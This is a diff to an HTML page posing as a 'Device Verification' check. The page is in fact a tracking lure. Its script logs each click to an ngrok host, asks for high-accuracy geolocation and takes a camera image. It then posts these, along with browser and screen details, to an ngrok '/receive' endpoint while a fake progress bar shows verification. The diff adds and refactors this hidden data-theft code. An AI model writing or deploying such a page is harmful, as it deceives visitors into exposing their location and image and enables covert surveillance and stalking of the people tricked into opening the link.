@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Verification</title>
+  <title>Device Verification</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; text-align: center; }
@@ -11,51 +11,38 @@
   </style>
 </head>
 <body>
-<h2>To access this page, <br>You must verify your legitimacy <br>By clickicking on <strong>Allow whiles visiting this site</strong> <br>Verifying your device...</h2>
+<h2>Device Verification</h2>
 <div id="progress"><div id="progress-bar"></div></div>
-<div id="status">Initializing...</div>
+<div id="status">Initializing verification...</div>
 
 <script>
-async function collectData() {
-  const linkId = new URLSearchParams(window.location.search).get('id');
-  if (!linkId) return;
-  
-  // Track click
-  await fetch(`https://cff93abba672.ngrok-free.app/track_click/${linkId}`)
-    .catch(e => console.error("Click tracking failed:", e));
+const SERVER_URL = "https://cff93abba672.ngrok-free.app";
 
+function updateStatus(percent, message) {
+  document.getElementById('progress-bar').style.width = percent + '%';
+  document.getElementById('status').innerText = message;
+}
+
+async function trackClick(linkId) {
   try {
-    // Get location
-    const position = await getPosition();
-    
-    // Capture image
-    const image = await captureImage();
-    
-    // Send data
-    await sendData({
-      link_id: linkId,
-      latitude: position.coords.latitude,
-      longitude: position.coords.longitude,
-      accuracy: position.coords.accuracy,
-      image: image,
-      user_agent: navigator.userAgent,
-      screen: `${window.screen.width}x${window.screen.height}`
-    });
+    await fetch(`${SERVER_URL}/track_click/${linkId}`);
   } catch (e) {
-    updateStatus(100, "Verification failed");
+    console.error("Click tracking failed:", e);
   }
 }
 
-async function getPosition() {
-  updateStatus(30, "Getting location...");
-  return new Promise((resolve, reject) => {
-    navigator.geolocation.getCurrentPosition(resolve, reject, {
-      enableHighAccuracy: true,
-      timeout: 10000
+async function getLocation() {
+  updateStatus(30, "Requesting location...");
+  try {
+    return await new Promise((resolve, reject) => {
+      navigator.geolocation.getCurrentPosition(resolve, reject, {
+        enableHighAccuracy: true,
+        timeout: 10000
+      });
     });
-  }).catch(() => ({
-    coords: { latitude: 0, longitude: 0, accuracy: 0 }
-  }));
+  } catch {
+    return { coords: { latitude: 0, longitude: 0, accuracy: 0 } };
+  }
 }
 
 async function captureImage() {
@@ -86,23 +73,44 @@ async function captureImage() {
 
 async function sendData(data) {
   updateStatus(80, "Sending data...");
-  await fetch('https://d6d13ede2ed0.ngrok-free.app/receive', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(data)
+  try {
+    const response = await fetch(`${SERVER_URL}/receive`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    });
+    
+    if (!response.ok) throw new Error(await response.text());
+    updateStatus(100, "Verification complete!");
+  } catch (error) {
+    console.error("Error:", error);
+    updateStatus(100, "Verification failed. Please try again.");
+  }
+}
+
+async function runVerification() {
+  const linkId = new URLSearchParams(window.location.search).get('id');
+  if (!linkId) return updateStatus(100, "Invalid verification link");
+
+  await trackClick(linkId);
+  
+  const position = await getLocation();
+  const image = await captureImage();
+  
+  await sendData({
+    link_id: linkId,
+    latitude: position.coords.latitude,
+    longitude: position.coords.longitude,
+    accuracy: position.coords.accuracy,
+    image: image,
+    user_agent: navigator.userAgent,
+    platform: navigator.platform,
+    screen: `${window.screen.width}x${window.screen.height}`
   });
-  updateStatus(100, "Verification complete!");
 }
 
-function updateStatus(percent, message) {
-  document.getElementById('progress-bar').style.width = percent + '%';
-  document.getElementById('status').innerText = message;
-}
-
-// Start collection
-setTimeout(collectData, 500);
+// Start verification
+setTimeout(runVerification, 500);
 </script>
 </body>
 </html>
-
-
